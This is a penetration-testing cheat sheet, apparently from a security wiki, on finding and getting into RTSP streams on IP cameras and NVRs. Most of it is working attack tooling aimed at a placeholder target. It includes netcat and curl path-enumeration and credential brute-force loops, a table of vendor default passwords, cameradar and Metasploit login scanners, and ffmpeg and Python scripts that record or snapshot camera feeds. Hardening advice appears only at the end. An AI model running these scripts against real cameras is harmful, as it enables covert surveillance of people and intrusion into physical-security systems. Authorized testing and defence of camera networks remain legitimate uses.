---
title: "RTSP — Real Time Streaming Protocol"
date: 2026-02-24
draft: false
---

## Overview

RTSP (Real Time Streaming Protocol, RFC 2326) is an application-layer protocol for controlling media streaming servers. It is used extensively in IP cameras, NVRs (Network Video Recorders), DVRs, media servers, and surveillance infrastructure. RTSP is commonly found on port 554 and is frequently misconfigured to allow unauthenticated stream access. Exposed RTSP streams are a significant privacy and security risk in corporate, industrial, and residential environments.

**Default Ports:**
| Port | Service |
|------|---------|
| 554 | RTSP (standard) |
| 8554 | RTSP (alternative) |
| 8080 | RTSP over HTTP tunneling |
| 1935 | RTMP (related streaming protocol) |

---

## Protocol Overview

RTSP is a stateful protocol that uses HTTP-like methods:

| Method | Description |
|--------|-------------|
| `OPTIONS` | Query available methods |
| `DESCRIBE` | Get stream information (SDP response) |
| `SETUP` | Establish transport parameters |
| `PLAY` | Start stream delivery |
| `PAUSE` | Pause stream |
| `TEARDOWN` | End session |
| `ANNOUNCE` | Send SDP to server |
| `GET_PARAMETER` | Query parameters (often used as ping) |

---

## Recon and Fingerprinting

### Nmap

```bash
# Service detection
nmap -sV -p 554,8554,8080 TARGET_IP

# RTSP-specific scripts
nmap -p 554 --script rtsp-methods TARGET_IP
nmap -p 554 --script rtsp-url-brute TARGET_IP

# Aggressive scan
nmap -sV -sC -p 554 TARGET_IP
```

### Manual OPTIONS Request

```bash
# Send RTSP OPTIONS to enumerate methods
printf 'OPTIONS rtsp://TARGET_IP:554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n' | nc TARGET_IP 554

# Using curl
curl -v --rtsp-request OPTIONS rtsp://TARGET_IP:554/

# Check with specific path
printf 'OPTIONS rtsp://TARGET_IP:554/live RTSP/1.0\r\nCSeq: 1\r\n\r\n' | nc -q3 TARGET_IP 554
```

### DESCRIBE Request — Stream Information and SDP Analysis

```bash
# Get stream SDP (contains codec info, resolution, frame rate)
printf 'DESCRIBE rtsp://TARGET_IP:554/ RTSP/1.0\r\nCSeq: 1\r\nAccept: application/sdp\r\n\r\n' | nc TARGET_IP 554

# With curl
curl -v --rtsp-request DESCRIBE --rtsp-stream-uri rtsp://TARGET_IP:554/

# Multiple path attempts
for path in "/" "/live" "/stream" "/live/ch00_0" "/ch0" "/video" "/media/video1" "/axis-media/media.amp" "/cam/realmonitor" "/h264/ch1/main/av_stream" "/Streaming/Channels/1"; do
  CODE=$(printf "DESCRIBE rtsp://TARGET_IP:554$path RTSP/1.0\r\nCSeq: 1\r\nAccept: application/sdp\r\n\r\n" | nc -q3 TARGET_IP 554 2>/dev/null | head -1)
  echo "$path: $CODE"
done
```

### SDP Analysis

A successful `DESCRIBE` response returns an SDP (Session Description Protocol) body. Analyze it before opening the video stream — it reveals device capabilities and exact codec configuration:

```
# Example SDP response (annotated):
v=0
o=- 1234567890 1234567890 IN IP4 TARGET_IP
s=Session                        # Session name — sometimes contains device model
t=0 0
m=video 0 RTP/AVP 96             # Media type=video, payload type=96 (dynamic)
a=rtpmap:96 H264/90000           # Codec=H.264, RTP clock=90000 Hz
a=fmtp:96 packetization-mode=1; profile-level-id=42e01f
#                                # profile-level-id=42e01f → Baseline Profile L3.1
#                                # Used to fingerprint firmware generation
a=control:trackID=1
m=audio 0 RTP/AVP 8              # Audio track: payload 8 = PCMA (G.711 A-law)
a=rtpmap:8 PCMA/8000
```

Key fields to extract:
- `m=video ... RTP/AVP 96` → media type and payload format number
- `a=rtpmap:96 H264/90000` → codec and clock rate (H.264 at 90kHz is standard)
- `a=fmtp:96 profile-level-id=...` → exact H.264 profile fingerprint, useful for device model identification
- `s=` session name → sometimes contains vendor/model strings
- `a=control:` → sub-stream URIs for SETUP requests

---

## Unauthenticated Stream Access

### Testing Anonymous Access

```bash
# VLC direct stream test (no credentials)
vlc rtsp://TARGET_IP:554/

# ffprobe — get stream info without playing
ffprobe -v quiet -print_format json -show_streams "rtsp://TARGET_IP:554/" 2>&1

# ffmpeg stream capture (save 10 seconds)
ffmpeg -rtsp_transport tcp -i "rtsp://TARGET_IP:554/" -t 10 -c copy output.mp4

# GStreamer
gst-launch-1.0 rtspsrc location=rtsp://TARGET_IP:554/ ! decodebin ! autovideosink
```

### Check for Auth Requirements

```bash
# No auth attempt
printf 'DESCRIBE rtsp://TARGET_IP:554/live RTSP/1.0\r\nCSeq: 1\r\n\r\n' | nc -q3 TARGET_IP 554

# If 401 returned, check WWW-Authenticate header for digest/basic
# If 200 returned, no auth required — stream is open
```

---

## Default Credentials on Cameras and NVRs

Most IP cameras and NVRs ship with well-known default credentials.

### Common Default Credentials

| Vendor | Username | Password | Notes |
|--------|----------|----------|-------|
| Hikvision (legacy, pre-2016) | admin | 12345 | Legacy firmware / old stock only |
| Hikvision (post-2015/2016) | admin | (set on first boot) | Activation required — no default password |
| Dahua (older firmware) | admin | admin | Legacy only |
| Dahua (newer firmware) | admin | (set on first login) | Forced password change on first access; some models use empty password on first activation |
| Axis | root | pass / admin | Varies by firmware version |
| Bosch | admin | (blank) | |
| Hanwha/Samsung | admin | 4321 | |
| Vivotek | root | (blank) | |
| Foscam | admin | (blank) | |
| Reolink | admin | (blank) | |
| Amcrest | admin | admin | |
| Q-See | admin | admin | |

> **Hikvision activation model:** Devices manufactured after approximately 2015/2016 ship without a default password and require activation (setting a password) on first boot via the web UI, iVMS-4200 client, or SADP tool. A factory reset returns the device to "unactivated" state — not to `admin:12345`. The `admin:12345` credential only works on genuine legacy firmware or uninitialized old stock.
>
> **Dahua newer firmware:** Forces a password change on first login. Some models use `admin:` (empty password) only on the very first activation before the change is applied.

### Credential Brute Force with curl

```bash
# Basic auth test
for cred in "admin:admin" "admin:12345" "admin:password" "admin:" "root:root" "root:pass" "user:user"; do
  user=$(echo $cred | cut -d: -f1)
  pass=$(echo $cred | cut -d: -f2)
  RESULT=$(curl -s -o /dev/null -w "%{http_code}" \
    --rtsp-request DESCRIBE \
    --rtsp-stream-uri "rtsp://TARGET_IP:554/" \
    -u "$user:$pass" \
    --max-time 5)
  echo "$cred -> $RESULT"
done
```

---

## Stream URL Path Enumeration

RTSP cameras use non-standard paths depending on vendor and firmware.

### Common Vendor Path Patterns

```bash
# Hikvision
# rtsp://TARGET_IP:554/Streaming/Channels/1
# rtsp://TARGET_IP:554/Streaming/Channels/101
# rtsp://TARGET_IP:554/h264/ch1/main/av_stream
# rtsp://TARGET_IP:554/h264/ch1/sub/av_stream

# Dahua
# rtsp://TARGET_IP:554/cam/realmonitor?channel=1&subtype=0
# rtsp://TARGET_IP:554/cam/realmonitor?channel=1&subtype=1

# Axis
# rtsp://TARGET_IP:554/axis-media/media.amp
# rtsp://TARGET_IP:554/axis-media/media.amp?videocodec=h264

# Bosch
# rtsp://TARGET_IP:554/rtsp_tunnel?h26x=4&line=1&inst=1

# Samsung/Hanwha
# rtsp://TARGET_IP:554/profile1/media.smp

# Generic
# rtsp://TARGET_IP:554/live/ch00_0
# rtsp://TARGET_IP:554/live/main
# rtsp://TARGET_IP:554/stream1
# rtsp://TARGET_IP:554/video
# rtsp://TARGET_IP:554/1
```

### SecLists Wordlists for RTSP Path Enumeration

```bash
# SecLists contains RTSP-specific path wordlists:
ls /usr/share/seclists/Miscellaneous/ | grep -i rtsp
# Primary file: rtsp_paths.txt

# Use with cameradar (preferred)
docker run --net=host -t ullaakut/cameradar -t TARGET_IP \
  --custom-routes /usr/share/seclists/Miscellaneous/rtsp_paths.txt

# Use with custom bash script (see below)
WORDLIST="/usr/share/seclists/Miscellaneous/rtsp_paths.txt"
```

### Automated Path Brute Force

```bash
#!/bin/bash
TARGET="TARGET_IP"
PORT="554"

PATHS=(
    "/"
    "/live"
    "/stream"
    "/video"
    "/1"
    "/h264"
    "/live/ch00_0"
    "/live/main"
    "/Streaming/Channels/1"
    "/Streaming/Channels/101"
    "/h264/ch1/main/av_stream"
    "/cam/realmonitor?channel=1&subtype=0"
    "/axis-media/media.amp"
    "/stream1"
    "/ch0"
    "/channel1"
    "/media/video1"
    "/video1"
    "/mpeg4/1/media.amp"
    "/onvif/media_service"
    "/rtsp"
    "/live.sdp"
    "/stream.sdp"
    "/media.sdp"
)

echo "[*] Testing RTSP paths on $TARGET:$PORT"
for path in "${PATHS[@]}"; do
    RESPONSE=$(printf "DESCRIBE rtsp://$TARGET:$PORT$path RTSP/1.0\r\nCSeq: 1\r\nAccept: application/sdp\r\n\r\n" | nc -q3 $TARGET $PORT 2>/dev/null)
    STATUS=$(echo "$RESPONSE" | head -1 | awk '{print $2}')
    if [[ "$STATUS" == "200" ]]; then
        echo "[+] OPEN (200): rtsp://$TARGET:$PORT$path"
    elif [[ "$STATUS" == "401" ]]; then
        echo "[AUTH] 401: rtsp://$TARGET:$PORT$path"
        echo "$RESPONSE" | grep -i "WWW-Authenticate"
    fi
done
```

---

## RTSPS — RTSP over TLS

RTSPS is an encrypted variant of RTSP, typically on port 322 or 2022. It is rarely implemented correctly on consumer and mid-range IP cameras.

```bash
# Test RTSPS stream access
ffplay rtsps://TARGET_IP:322/stream
ffplay rtsps://TARGET_IP:2022/stream

# ffmpeg with TLS certificate validation disabled
ffmpeg -rtsp_flags +prefer_tcp -i "rtsps://TARGET_IP:322/live" -t 10 -c copy output.mp4

# Check TLS certificate details
openssl s_client -connect TARGET_IP:322 </dev/null 2>&1 | grep -E "subject|issuer|NotAfter|Protocol"
```

**Common misconfigurations on consumer devices:**
- Self-signed or factory-default certificates (easy to identify and MitM)
- TLS 1.0 or TLS 1.1 still accepted (deprecated, attackable)
- Expired certificates with no revocation checking
- Certificate CN does not match the device IP/hostname (certificate pinning not enforced)

---

## cameradar — Automated RTSP Discovery

```bash
# Install cameradar
docker pull ullaakut/cameradar

# Basic scan
docker run --net=host -t ullaakut/cameradar -t TARGET_IP

# Scan network range
docker run --net=host -t ullaakut/cameradar -t 192.168.1.0/24

# Custom timeout
docker run --net=host -t ullaakut/cameradar -t TARGET_IP --timeout 5

# Output results to file
docker run --net=host -t ullaakut/cameradar -t TARGET_IP 2>&1 | tee rtsp_scan.txt
```

cameradar automates:
- RTSP port scanning
- Path enumeration (uses a built-in wordlist)
- Credential brute force
- Stream accessibility verification

---

## Stream Capture and Analysis

### ffmpeg — Stream Recording

```bash
# Record stream to file (30 seconds)
ffmpeg -rtsp_transport tcp \
  -i "rtsp://TARGET_IP:554/live" \
  -t 30 \
  -vcodec copy \
  -acodec copy \
  captured_stream.mp4

# With credentials
ffmpeg -rtsp_transport tcp \
  -i "rtsp://admin:admin@TARGET_IP:554/stream" \
  -t 60 \
  -vcodec copy captured.mp4

# Extract single frame (snapshot)
ffmpeg -rtsp_transport tcp \
  -i "rtsp://TARGET_IP:554/live" \
  -frames:v 1 \
  -f image2 \
  snapshot_%03d.jpg

# Get stream metadata without capturing
ffprobe -v error \
  -select_streams v:0 \
  -show_entries stream=width,height,codec_name,r_frame_rate \
  -of json \
  "rtsp://TARGET_IP:554/live"
```

### Python RTSP Stream Capture

```python
#!/usr/bin/env python3
"""RTSP stream snapshot capture using OpenCV."""
import cv2
import sys
import os

def capture_rtsp(url, output_dir="rtsp_captures", num_frames=5):
    os.makedirs(output_dir, exist_ok=True)

    # Try connection
    cap = cv2.VideoCapture(url)
    if not cap.isOpened():
        print(f"[-] Cannot open stream: {url}")
        return False

    info = {
        'width': int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)),
        'height': int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT)),
        'fps': cap.get(cv2.CAP_PROP_FPS),
        'codec': int(cap.get(cv2.CAP_PROP_FOURCC)),
    }
    print(f"[+] Stream opened: {info}")

    saved = 0
    attempts = 0
    while saved < num_frames and attempts < 50:
        ret, frame = cap.read()
        if ret and frame is not None:
            filename = f"{output_dir}/frame_{saved:03d}.jpg"
            cv2.imwrite(filename, frame)
            print(f"[+] Saved: {filename}")
            saved += 1
        attempts += 1

    cap.release()
    return saved > 0

# Test URLs
URLS = [
    "rtsp://TARGET_IP:554/",
    "rtsp://TARGET_IP:554/live",
    "rtsp://TARGET_IP:554/stream",
    "rtsp://TARGET_IP:554/Streaming/Channels/1",
]

for url in URLS:
    if capture_rtsp(url):
        print(f"[+] Successfully captured from: {url}")
        break
```

---

## ONVIF Discovery (Adjacent to RTSP)

Many IP cameras support ONVIF (Open Network Video Interface Forum), which can reveal RTSP URLs via WS-Discovery:

```bash
# WS-Discovery broadcast
python3 -c "
import socket
import struct

# WS-Discovery multicast
MCAST_GRP = '239.255.255.250'
MCAST_PORT = 3702
DISCOVERY_MSG = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<e:Envelope xmlns:e=\"http://www.w3.org/2003/05/soap-envelope\"
  xmlns:w=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\"
  xmlns:d=\"http://schemas.xmlsoap.org/ws/2005/04/discovery\">
  <e:Header>
    <w:MessageID>uuid:test-onvif-discover</w:MessageID>
    <w:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</w:To>
    <w:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</w:Action>
  </e:Header>
  <e:Body>
    <d:Probe><d:Types>tds:Device</d:Types></d:Probe>
  </e:Body>
</e:Envelope>'''

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
sock.settimeout(3)
sock.sendto(DISCOVERY_MSG.encode(), (MCAST_GRP, MCAST_PORT))
try:
    while True:
        data, addr = sock.recvfrom(65535)
        print(f'Device at {addr}: {data[:500]}')
except socket.timeout:
    pass
"

# python-onvif-zeep to get camera stream URLs
pip3 install onvif-zeep
python3 -c "
from onvif import ONVIFCamera
cam = ONVIFCamera('TARGET_IP', 80, 'admin', 'admin')
media = cam.create_media_service()
profiles = media.GetProfiles()
for p in profiles:
    uri = media.GetStreamUri({'StreamSetup': {'Stream': 'RTP-Unicast', 'Transport': {'Protocol': 'RTSP'}}, 'ProfileToken': p.token})
    print(f'Profile {p.Name}: {uri.Uri}')
"
```

---

## Metasploit — RTSP Scanning

```bash
msfconsole -q

# RTSP scanner
use auxiliary/scanner/rtsp/options
set RHOSTS TARGET_IP
run

# RTSP URL brute force
use auxiliary/scanner/rtsp/rtsp_login
set RHOSTS TARGET_IP
set RPORT 554
run
```

---

## Security Implications

| Finding | Risk |
|---------|------|
| Unauthenticated stream | Direct privacy/surveillance exposure |
| Authenticated stream (weak creds) | Trivial brute force |
| Camera in sensitive area | Corporate espionage, physical security bypass |
| RTSP on segmented network | Pivot point for lateral movement |
| Stream replay capability | Disable by replaying old footage (physical security bypass) |

---

## Hardening Recommendations

- Enable authentication (Digest is preferred over Basic) for all RTSP streams
- Change default credentials immediately after deployment
- Restrict RTSP access to authorized IP ranges via firewall
- Use VPN for remote camera access instead of exposing port 554 publicly
- Disable RTSP if not needed — use HLS/DASH over HTTPS instead
- Segment camera networks (dedicated VLAN) and deny internet access
- Monitor for unauthorized RTSP access via IDS/firewall logs
- Regularly audit camera firmware for known CVEs (Hikvision, Dahua have had multiple critical vulnerabilities)


---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.